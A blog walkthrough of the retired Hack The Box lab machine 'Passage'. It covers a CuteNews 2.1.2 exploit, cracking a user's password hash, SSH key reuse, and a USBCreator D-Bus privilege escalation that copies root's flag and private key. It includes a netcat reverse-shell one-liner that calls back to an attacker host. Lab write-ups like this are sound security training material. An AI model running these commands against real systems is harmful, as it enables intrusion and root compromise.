Hello everyone!

The box of this week will be Passage, a medium-rated Linux box from Hack The Box created by [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851). 

Write-ups for Hack The Box are always posted as soon as machines get retired.

## Enumeration

Started the enumeration, as usual, by running `nmap` quickscan to check what is running on this box.

```
$ nmap -sC -sV -Pn -oA quick 10.10.10.206

### 80/TCP - HTTP Service

Accessing the web page noticed that it is a blog built using **[CuteNews](http://cutephp.com/)** and the first post is very interesting, mentioning that Fail2Ban was recently implemented. This will prevent us from using any kind of brute force enumeration (`dirbuster` and related tools/techniques). 

![image-20210225141945974](https://i.imgur.com/XLBq0J7.png){: .align-center}

Inspecting the source code of the page, while searching for interesting links, found some e-mail addresses, besides the **passage.htb** domain, which was added to the local hosts file. 

```
$ curl -L http://10.10.10.206 | grep -Eo 'href="(.*)"' | grep -v 'index.php' | sort -u

After some research about the product, found the administration page at `http://passage.htb/CuteNews` where I could identify the running version, which is **2.1.2**. 

![image-20210225154213926](https://i.imgur.com/cYxMtVe.png){: .align-center}

## Initial Foothold

Checking existing exploits for this product version, found 4 alternatives in `searchsploit` where I've used the last one, **48800**,  to which I also needed to make some adjustments.

```
$ searchsploit cutenews 2.1.2
---------------------------------------------------------------------- ---------------------------------

```

At first execution not only got a reverse shell but also a dump of all password hashes

```
$ python3 48800.py

Cracking these hashes using john found a password **atlanta1**, which belongs to user **paul**, which I have discovered after some edits in the script to disclose this information, as seen below.

With the obtained RCE as **www-data**, sent payload and retrieved an interactive reverse shell using the payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`. 

## User flag

### Enumeration

After running `linpeas.sh` found some interesting information:

- This box is vulnerable to **USBCreator**

  ```
  [+] USBCreator
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
  Vulnerable!!
  ```

  Besides having this vulnerability in place, when tried to exploit it like explained in [this link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) it didn't worked due to lack of permissions, which will probably work with another user. 

  ```bash
  www-data@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
  Error: GDBus.Error:org.freedesktop.DBus.Python.dbus.exceptions.DBusException: com.ubuntu.USBCreator.Error.NotAuthorized
  (According to introspection data, you need to pass 'ssb')
  ```

- Noted other 2 users in this box, where these were initially listed as e-mail addresses in the page and Paul called us attention once this is a user to which we have already cracked a password.

  ```
  [+] Users with console
  nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
  paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
  root:x:0:0:root:/root:/bin/bash
  ```

- Permissions for the console users, where **nadav** is the one that holds more privileges in the system, including being a member of **sudo** group. 

  ```
  [+] All users & groups
  uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
  uid=1001(paul) gid=1001(paul) groups=1001(paul)
  ```
  

 First thing to test is Paul credentials, which worked successfully at first try and allowed us to get the user flag! :smile:

```
www-data@passage:~$ su paul
Password:
paul@passage:~$ cat user.txt
<redacted>
paul@passage:~$
```

## Root flag

First thing to do with *paul* credentials was another attempt to exploit USBCreator vulnerability, which failed just like www-data due to insufficient privileges.

Analyzing the user's home directory, found a RSA keypair where Paul authored it to ssh without credentials adding the public key inside `authorized_keys` file. 

```
paul@passage:~/.ssh$ ls -la
total 24
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .
drwxr-x--- 16 paul paul 4096 Feb  5 06:30 ..
-rw-r--r--  1 paul paul  395 Jul 21  2020 authorized_keys
-rw-------  1 paul paul 1679 Jul 21  2020 id_rsa
-rw-r--r--  1 paul paul  395 Jul 21  2020 id_rsa.pub
-rw-r--r--  1 paul paul 1312 Jul 21  2020 known_hosts
```

Taking a closer look to `id_rsa.pub`, noticed that it was created by **nadav**. After seeing this I have immediately tried to ssh using the obtained private key as this user and luckily I had success on it! :smiley:

```bash
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage

$ ssh -i id_rsa nadav@10.10.10.206
Last login: Thu Feb 25 13:41:27 2021 from 10.10.10.10
nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
Finally, now as **nadav**, gave another try to USBCreator vulnerability and this time we had success once we have all required permissions to execute it. 

The USBCreator exploit allow us to get a file using root permission. If you only want to get the flag you can run the command below copying the file `root.txt` to the `/tmp` directory. 

```bash
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
```

If you want to truly get root and an interactive shell there are some possibilities that we must try:

- Obtain a copy of `/etc/shadow`, unshadow it and crack the passwords using John or Hashcat, which didn't worked for me with the dictionaries used;
- Verify the existence of  `id_rsa` file inside root profile, as well as the presence of it in the **authorized_keys**, which was the option we had success as below and obtained the root flag:

```bash
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/somefilename true

## Attacker machine
$ scp -i id_rsa nadav@10.10.10.206:/tmp/somefilename .
$ chmod +600 id_rsa
$ ssh -i root@10.10.10.206
root@passage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@passage:~# cat /root/root.txt
<redacted>
```

I hope it was somehow useful! 

See you in the next post! :smile:
